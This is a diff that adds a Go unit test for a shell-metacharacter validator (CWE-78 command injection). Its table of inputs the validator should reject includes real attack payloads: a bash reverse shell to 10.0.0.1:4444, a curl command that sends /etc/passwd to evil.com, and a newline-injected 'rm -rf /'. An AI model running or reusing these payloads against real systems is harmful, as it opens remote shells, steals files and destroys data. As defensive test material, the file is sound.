@@ -297,3 +297,65 @@ func TestPromptYesNo_EmptyQuestionValidation(t *testing.T) {
 		})
 	}
 }
+
+// TestValidateNoShellMeta exercises the shell metacharacter validator
+// against known injection vectors (CWE-78: OS Command Injection).
+// Reference: https://owasp.org/www-community/attacks/Command_Injection
+func TestValidateNoShellMeta(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		input   string
+		wantErr bool
+		reason  string
+	}{
+		// Safe inputs - must pass
+		{name: "plain_text", input: "hello", wantErr: false, reason: "plain text is safe"},
+		{name: "alphanumeric", input: "user123", wantErr: false, reason: "alphanumeric is safe"},
+		{name: "hyphen_underscore", input: "my-service_name", wantErr: false, reason: "hyphens and underscores are safe"},
+		{name: "spaces", input: "hello world", wantErr: false, reason: "spaces alone are safe"},
+		{name: "dots_slashes", input: "/etc/config.d/file.conf", wantErr: false, reason: "path characters are safe"},
+		{name: "equals", input: "KEY=VALUE", wantErr: false, reason: "equals sign is safe"},
+		{name: "at_sign", input: "user@domain.com", wantErr: false, reason: "at sign is safe"},
+		{name: "empty", input: "", wantErr: false, reason: "empty string is safe"},
+
+		// Shell metacharacters - must reject
+		{name: "backtick", input: "`id`", wantErr: true, reason: "backtick enables command substitution"},
+		{name: "dollar_sign", input: "$HOME", wantErr: true, reason: "dollar sign enables variable expansion"},
+		{name: "command_sub", input: "$(whoami)", wantErr: true, reason: "$() enables command substitution"},
+		{name: "variable_exp", input: "${PATH}", wantErr: true, reason: "${} enables variable expansion"},
+		{name: "ampersand", input: "cmd & bg", wantErr: true, reason: "& enables background execution"},
+		{name: "pipe", input: "cmd | nc", wantErr: true, reason: "| enables piping"},
+		{name: "semicolon", input: "cmd; rm", wantErr: true, reason: "; enables command chaining"},
+		{name: "lt_redirect", input: "cmd < /etc/passwd", wantErr: true, reason: "< enables input redirection"},
+		{name: "gt_redirect", input: "cmd > /tmp/out", wantErr: true, reason: "> enables output redirection"},
+		{name: "open_paren", input: "(subshell)", wantErr: true, reason: "() enables subshell"},
+		{name: "open_brace", input: "{expansion}", wantErr: true, reason: "{} enables brace expansion"},
+		{name: "backslash", input: "test\\n", wantErr: true, reason: "backslash enables escape sequences"},
+		{name: "double_amp", input: "test&&rm", wantErr: true, reason: "&& enables conditional execution"},
+		{name: "double_pipe", input: "test||echo", wantErr: true, reason: "|| enables alternative execution"},
+
+		// Control characters - must reject
+		{name: "newline", input: "test\nrm -rf /", wantErr: true, reason: "newline enables command injection"},
+		{name: "carriage_return", input: "test\revil", wantErr: true, reason: "CR enables log injection"},
+		{name: "tab", input: "test\tevil", wantErr: true, reason: "tab can confuse parsers"},
+		{name: "null_byte", input: "test\x00evil", wantErr: true, reason: "null byte enables truncation attacks"},
+
+		// Real-world attack payloads
+		{name: "reverse_shell", input: "test;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", wantErr: true, reason: "reverse shell payload"},
+		{name: "data_exfil", input: "$(curl http://evil.com/$(cat /etc/passwd))", wantErr: true, reason: "data exfiltration"},
+		{name: "rm_payload", input: "test\nrm -rf /", wantErr: true, reason: "newline + destructive command"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := ValidateNoShellMeta(tt.input)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidateNoShellMeta(%q) error = %v, wantErr %v (reason: %s)",
+					tt.input, err, tt.wantErr, tt.reason)
+			}
+		})
+	}
+}
